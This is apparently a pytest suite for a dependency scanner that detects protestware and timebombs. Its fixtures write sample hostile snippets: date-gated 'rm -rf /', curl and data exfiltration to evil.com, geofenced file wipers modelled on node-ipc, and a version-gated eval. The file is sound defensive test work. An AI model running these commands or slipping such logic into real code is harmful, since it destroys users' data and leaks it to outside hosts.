"""Tests for the protestware/timebomb scanner."""

from __future__ import annotations

import pytest

from depfence.scanners.protestware_scanner import ProtestwareScanner


@pytest.fixture
def scanner():
    return ProtestwareScanner()


@pytest.fixture
def project(tmp_path):
    return tmp_path


# ── PW-01: Date/time gates ──────────────────────────────────────────────

@pytest.mark.asyncio
async def test_js_date_comparison_timebomb(scanner, project):
    """new Date() > new Date('2024-01-01') pattern — colors.js style."""
    (project / "index.js").write_text(
        'if (new Date() > new Date("2024-01-01")) { process.exit(1); }'
    )
    findings = await scanner.scan_project(project)
    pw01 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-01")]
    assert len(pw01) >= 1
    assert "timebomb" in pw01[0].title.lower() or "date" in pw01[0].title.lower()


@pytest.mark.asyncio
async def test_python_datetime_comparison(scanner, project):
    """datetime.now() >= datetime(...) pattern."""
    (project / "payload.py").write_text(
        "from datetime import datetime\n"
        "if datetime.now() >= datetime(2024, 6, 1):\n"
        "    import os; os.system('rm -rf /')\n"
    )
    findings = await scanner.scan_project(project)
    pw01 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-01")]
    assert len(pw01) >= 1


@pytest.mark.asyncio
async def test_date_now_epoch_comparison(scanner, project):
    """Date.now() > 1700000000000 epoch millisecond check."""
    (project / "lib.js").write_text(
        'if (Date.now() > 1700000000000) { require("child_process").execSync("curl evil.com"); }'
    )
    findings = await scanner.scan_project(project)
    pw01 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-01")]
    assert len(pw01) >= 1


@pytest.mark.asyncio
async def test_year_check_gate(scanner, project):
    """getFullYear() === 2024 year gate."""
    (project / "check.js").write_text(
        'if (new Date().getFullYear() >= 2024) { console.log("activated"); }'
    )
    findings = await scanner.scan_project(project)
    pw01 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-01")]
    assert len(pw01) >= 1


# ── PW-02: Locale/timezone gates ────────────────────────────────────────

@pytest.mark.asyncio
async def test_timezone_detection(scanner, project):
    """Intl timezone resolution — geofencing prerequisite."""
    (project / "geo.js").write_text(
        'const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;\n'
        'if (tz.includes("Moscow")) { wipe(); }\n'
    )
    findings = await scanner.scan_project(project)
    pw02 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-02")]
    assert len(pw02) >= 1


@pytest.mark.asyncio
async def test_env_lang_check(scanner, project):
    """process.env.LANG locale sniffing."""
    (project / "i18n.js").write_text(
        'const lang = process.env.LANG;\n'
        'if (lang.startsWith("ru")) { payload(); }\n'
    )
    findings = await scanner.scan_project(project)
    pw02 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-02")]
    assert len(pw02) >= 1


@pytest.mark.asyncio
async def test_python_locale_check(scanner, project):
    """locale.getdefaultlocale() in Python."""
    (project / "check.py").write_text(
        "import locale\n"
        "lang, _ = locale.getdefaultlocale()\n"
        "if 'ru' in lang: do_something()\n"
    )
    findings = await scanner.scan_project(project)
    pw02 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-02")]
    assert len(pw02) >= 1


# ── PW-03: IP geolocation ───────────────────────────────────────────────

@pytest.mark.asyncio
async def test_geoip_api_lookup(scanner, project):
    """ip-api.com geolocation — node-ipc pattern."""
    (project / "geo.js").write_text(
        'fetch("http://ip-api.com/json").then(r => r.json()).then(d => {\n'
        '  if (d.countryCode === "RU") { wipeFiles(); }\n'
        '});\n'
    )
    findings = await scanner.scan_project(project)
    pw03 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-03")]
    assert len(pw03) >= 1


@pytest.mark.asyncio
async def test_country_code_conditional(scanner, project):
    """Direct country code comparison targeting specific nations."""
    (project / "geo.py").write_text(
        'if country_code == "RU" or country_code == "BY":\n'
        '    os.remove(important_file)\n'
    )
    findings = await scanner.scan_project(project)
    pw03b = [f for f in findings if f.metadata.get("rule") == "PW-03b"]
    assert len(pw03b) >= 1
    assert pw03b[0].severity.value in ("high", "critical")


# ── PW-04: Infinite loops ───────────────────────────────────────────────

@pytest.mark.asyncio
async def test_js_infinite_loop(scanner, project):
    """while(true){} infinite loop — colors.js DoS pattern."""
    (project / "loop.js").write_text(
        'function zalgo() { while (true) { console.log("aaaa"); } }'
    )
    findings = await scanner.scan_project(project)
    pw04 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-04")]
    assert len(pw04) >= 1


@pytest.mark.asyncio
async def test_python_infinite_loop(scanner, project):
    """while True: infinite loop in Python."""
    (project / "bomb.py").write_text(
        "while True:\n"
        "    print('forever')\n"
    )
    findings = await scanner.scan_project(project)
    pw04 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-04")]
    assert len(pw04) >= 1


@pytest.mark.asyncio
async def test_infinite_loop_in_test_file_low_severity(scanner, project):
    """Infinite loops in test files should get lower severity."""
    test_dir = project / "test"
    test_dir.mkdir()
    (test_dir / "test_worker.js").write_text(
        'describe("worker", () => { while (true) { await sleep(1000); } });'
    )
    findings = await scanner.scan_project(project)
    pw04 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-04")]
    assert len(pw04) >= 1
    assert pw04[0].severity == __import__("depfence.core.models", fromlist=["Severity"]).Severity.LOW


# ── PW-05: Destructive ops near protest strings ─────────────────────────

@pytest.mark.asyncio
async def test_destructive_with_protest_strings(scanner, project):
    """fs.unlinkSync near 'peace' string — node-ipc pattern."""
    (project / "peace.js").write_text(
        'const msg = "peace not war";\n'
        'fs.unlinkSync(targetPath);\n'
    )
    findings = await scanner.scan_project(project)
    pw05 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-05")]
    assert len(pw05) >= 1
    assert pw05[0].severity.value == "critical"


@pytest.mark.asyncio
async def test_rmtree_near_ukraine_string(scanner, project):
    """shutil.rmtree near Ukraine-related string."""
    (project / "wiper.py").write_text(
        "# stop war in ukraine\n"
        "import shutil\n"
        "shutil.rmtree('/important/data')\n"
    )
    findings = await scanner.scan_project(project)
    pw05 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-05")]
    assert len(pw05) >= 1


@pytest.mark.asyncio
async def test_rm_rf_with_freedom_message(scanner, project):
    """rm -rf near 'freedom' — classic protestware pattern."""
    (project / "protest.sh").write_text(
        '#!/bin/bash\n'
        'echo "fight for freedom"\n'
        'rm -rf /target/directory\n'
    )
    findings = await scanner.scan_project(project)
    pw05 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-05")]
    assert len(pw05) >= 1


# ── PW-06: Version-gated execution ──────────────────────────────────────

@pytest.mark.asyncio
async def test_version_gated_eval(scanner, project):
    """Version check followed by eval — event-stream pattern."""
    (project / "inject.js").write_text(
        'if (version === "3.3.6") {\n'
        '  eval(decoded_payload);\n'
        '}\n'
    )
    findings = await scanner.scan_project(project)
    pw06 = [f for f in findings if f.metadata.get("rule", "").startswith("PW-06")]
    assert len(pw06) >= 1
    assert pw06[0].severity.value == "high"


# ── PW-COMBO: Mixed signals ─────────────────────────────────────────────

@pytest.mark.asyncio
async def test_mixed_signals_combo(scanner, project):
    """env check + destructive op + network = highest confidence."""
    (project / "attack.js").write_text(
        'const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;\n'
        'if (tz.includes("Europe/Moscow")) {\n'
        '  fs.unlinkSync("/important/file");\n'
        '  https.get("http://evil.com/exfil?data=" + leaked);\n'
        '}\n'
    )
    findings = await scanner.scan_project(project)
    combo = [f for f in findings if f.metadata.get("rule") == "PW-COMBO"]
    assert len(combo) == 1
    assert combo[0].severity.value == "high"
    assert combo[0].confidence >= 0.85


# ── Clean files — no false positives ─────────────────────────────────────

@pytest.mark.asyncio
async def test_clean_date_usage_no_finding(scanner, project):
    """Normal date formatting should not trigger."""
    (project / "util.js").write_text(
        'const now = new Date();\n'
        'console.log(now.toISOString());\n'
    )
    findings = await scanner.scan_project(project)
    assert len(findings) == 0


@pytest.mark.asyncio
async def test_clean_i18n_no_finding(scanner, project):
    """Normal i18n usage should not trigger."""
    (project / "i18n.js").write_text(
        'const formatter = new Intl.NumberFormat("en-US");\n'
        'console.log(formatter.format(1000));\n'
    )
    findings = await scanner.scan_project(project)
    assert len(findings) == 0


@pytest.mark.asyncio
async def test_clean_fetch_no_finding(scanner, project):
    """Normal fetch usage should not trigger geolocation check."""
    (project / "api.js").write_text(
        'fetch("https://api.example.com/data").then(r => r.json());\n'
    )
    findings = await scanner.scan_project(project)
    assert len(findings) == 0


@pytest.mark.asyncio
async def test_skips_node_modules(scanner, project):
    """Files in node_modules should be skipped."""
    nm = project / "node_modules" / "evil"
    nm.mkdir(parents=True)
    (nm / "index.js").write_text(
        'if (new Date() > new Date("2024-01-01")) { process.exit(1); }'
    )
    findings = await scanner.scan_project(project)
    assert len(findings) == 0


@pytest.mark.asyncio
async def test_skips_non_code_files(scanner, project):
    """Non-code files (.json, .md) should be skipped."""
    (project / "data.json").write_text(
        '{"date": "2024-01-01", "country": "RU"}'
    )
    (project / "README.md").write_text(
        "# Note\nif (Date.now() > 1700000000000) we release v2"
    )
    findings = await scanner.scan_project(project)
    assert len(findings) == 0


@pytest.mark.asyncio
async def test_large_file_skipped(scanner, project):
    """Files over 500KB should be skipped."""
    (project / "huge.js").write_text("x" * 600_000)
    findings = await scanner.scan_project(project)
    assert len(findings) == 0


@pytest.mark.asyncio
async def test_line_numbers_accurate(scanner, project):
    """Line numbers in findings should be accurate."""
    (project / "bomb.js").write_text(
        "// line 1\n"
        "// line 2\n"
        "// line 3\n"
        'if (new Date() > new Date("2025-01-01")) { boom(); }\n'
    )
    findings = await scanner.scan_project(project)
    assert len(findings) >= 1
    assert findings[0].metadata["line"] == 4


@pytest.mark.asyncio
async def test_empty_project_no_findings(scanner, project):
    findings = await scanner.scan_project(project)
    assert findings == []


# ── Real-world reproduction: node-ipc (simplified) ──────────────────────

@pytest.mark.asyncio
async def test_nodeipc_reproduction(scanner, project):
    """Simplified reproduction of the node-ipc protestware attack."""
    (project / "ipc.js").write_text(
        'const https = require("https");\n'
        'https.get("http://ip-api.com/json", (res) => {\n'
        '  let data = "";\n'
        '  res.on("data", d => data += d);\n'
        '  res.on("end", () => {\n'
        '    const geo = JSON.parse(data);\n'
        '    if (geo.countryCode === "RU" || geo.countryCode === "BY") {\n'
        '      const files = readdirSync(".");\n'
        '      files.forEach(f => fs.unlinkSync(f));\n'
        '    }\n'
        '  });\n'
        '});\n'
    )
    findings = await scanner.scan_project(project)
    assert len(findings) >= 2
    rules = {f.metadata.get("rule") for f in findings}
    assert "PW-03a" in rules or "PW-03b" in rules
